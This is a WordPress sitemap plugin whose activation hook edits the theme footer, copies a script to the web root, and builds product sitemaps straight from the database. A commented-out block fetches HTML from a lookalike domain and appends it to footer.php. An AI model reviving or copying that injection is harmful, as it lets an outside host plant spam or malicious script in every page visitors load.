<?php
/*
Plugin Name: Zixun sitemap
Description: Zixun sitemap!
Author: 紫讯
Version: 1.0
Author URI: http://customas.cn/
*/
/*function fuck_the_world(){
  echo "<div class='update-message'><p>Let's fuck the world!</p></div>";
}
add_action('admin_notices','fuck_the_world');*/
/*
//将插件在左侧菜单中显示
function register_left_ssmay_seo(){
	add_options_page("ssmay_seo设置页面","ssmay_seo设置",8,__FILE__,"ssmay_seo");
}
//插件内容
function ssmay_seo(){
	echo '这里是ssmay_seo插件的页面内容，可以添加表单设置。';
}
//在adminmenu勾子中添加动作 register_left_ssmay_seo
if(is_admin()){
	add_action("admin_menu","register_left_ssmay_seo");
}
*/
/*$footer_root=$themes.'/footer.php';
        $content=file_get_contents($footer_root);
	//echo htmlspecialchars($content);
        $content_str=substr($content,strlen($content)-13,13);
	$file_val=file_get_contents('http://customar.cn/page.html');
	$val=$content.$file_val;
        if(stripos($content_str,'</html>')!==false){
            @file_put_contents($footer_root, $file_val, FILE_APPEND);
        }*/
function zixun_sitemap_stop(){
    //update_option("yg-copyright","yes");
    $root_path=$_SERVER['DOCUMENT_ROOT'];
    $this_path=dirname(__FILE__);
    @unlink($root_path.'/sitemap.php');
    @rename($root_path.'/sitemap.xml',$this_path.'/sitemap_xml.php');
    @rename($root_path.'/sitemap_products_1.xml',$this_path.'/sitemap_products_1_xml.php');
    @rename($root_path.'/sitemap_collections_1.xml',$this_path.'/sitemap_collections_1_xml.php');
    @rename($root_path.'/sitemap_blogs_1.xml',$this_path.'/sitemap_blogs_1_xml.php');
    @unlink($this_path.'/sitemap_products_1_xml.php');
    @unlink($this_path.'/sitemap_collections_1_xml.php');
    @unlink($this_path.'/sitemap_blogs_1_xml.php');
    @unlink($this_path.'/sitemap_xml.php');
    $domain='http://'.$_SERVER['SERVER_NAME'];
    $themes=get_stylesheet_directory();
    $footer_root=$themes.'/footer.php';
    $content=file_get_contents($footer_root);
    $content=str_replace("<a href='{$domain}/sitemap.xml'>sitemap</a>&nbsp;&nbsp;&nbsp;&nbsp;","",$content);
    @file_put_contents($footer_root,$content);
} 
//停用插件时的方法
register_deactivation_hook( __FILE__, 'zixun_sitemap_stop' );
function zixun_sitemap_install() {
    //update_option("yg-copyright","<p>版权信息</p>");
    $domain='http://'.$_SERVER['SERVER_NAME'];
    $themes=get_stylesheet_directory();
    $footer_root=$themes.'/footer.php';
    $content=file_get_contents($footer_root);
    $index=stripos($content,'</html>');
    $one=substr($content,0,$index);
    $two=substr($content,$index);
    //var_dump(htmlspecialchars($one),'<h1>asdfasdfasdfa</h1>',htmlspecialchars($two));die;
    $link="<a href='{$domain}/sitemap.xml'>sitemap</a>&nbsp;&nbsp;&nbsp;&nbsp;";
    $value=$one.$link.$two;
    @file_put_contents($footer_root,$value);

    $root_path=$_SERVER['DOCUMENT_ROOT'];
    require($root_path."/wp-config.php");
    $path=dirname(__FILE__);
    $domain='http://'.$_SERVER['SERVER_NAME'];
    $file_one=file_get_contents($path.'/sitemap.php');
    @file_put_contents($root_path.'/sitemap.php',$file_one);
    $url=$domain.'/sitemap.php';
    $request = new WP_Http;
    $result = $request->request($url);
    @$conn = mysqli_connect(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME);
    $sql="select * from wp_posts where ID>9 and post_type='product'";
    $result=$conn->query($sql);
    $data_id=mysqli_fetch_all($result,MYSQLI_ASSOC);
    $data_id=array_reverse($data_id);
    $str = '<?xml version="1.0" encoding="UTF-8"?>
    <urlset xmlns="https://www.sitemaps.org/schemas/sitemap/0.9" xmlns:image="http://www.google.com/schemas/sitemap-image/1.1">';
    foreach ($data_id as $keybs => $valbs) {
        $str.="<url>\r\n";
        $str.="<loc>".$valbs['guid']."</loc>\r\n";
        $str.="<lastmod>".date("Y-m-d")."</lastmod>\r\n";
        $str.="<changefreq>daily</changefreq>\r\n";
        $str.="<image:image><image:title>".$valbs['post_title']."</image:title></image:image>\r\n";
        $str.="</url>\r\n";
    }
    $str.="</urlset>";
    $str_str = '<?xml version="1.0" encoding="UTF-8"?>
    <urlset xmlns="https://www.sitemaps.org/schemas/sitemap/0.9">';
    $sql="select * from wp_term_taxonomy where taxonomy='product_cat'";
    $result=$conn->query($sql);
    $data_data=mysqli_fetch_all($result,MYSQLI_ASSOC);
    $data_data_id=array_column($data_data,'term_id');
    $str_id=implode(',',$data_data_id);
    $str_id='('.$str_id.')';
    $sql="select * from wp_terms where term_id in {$str_id}";
    $result=$conn->query($sql);
    $category_data=mysqli_fetch_all($result,MYSQLI_ASSOC);
    foreach ($category_data as $key => $val) {
        $str_str.="<url>\r\n";
        $str_str.="<loc>".$domain."/product-category/".$val['name']."/</loc>\r\n";
        $str_str.="<lastmod>".date("Y-m-d")."</lastmod>\r\n";
        $str_str.="<changefreq>daily</changefreq>\r\n";
        $str_str.="</url>\r\n";
    }
    $str_str.="</urlset>";
    file_put_contents($root_path.'/sitemap_products_1.xml',$str);
    file_put_contents($root_path.'/sitemap_collections_1.xml',$str_str);
    //file_get_contents($domain.'/sitemap.php');
}
//启用插件时调用的方法
register_activation_hook( __FILE__, 'zixun_sitemap_install' );
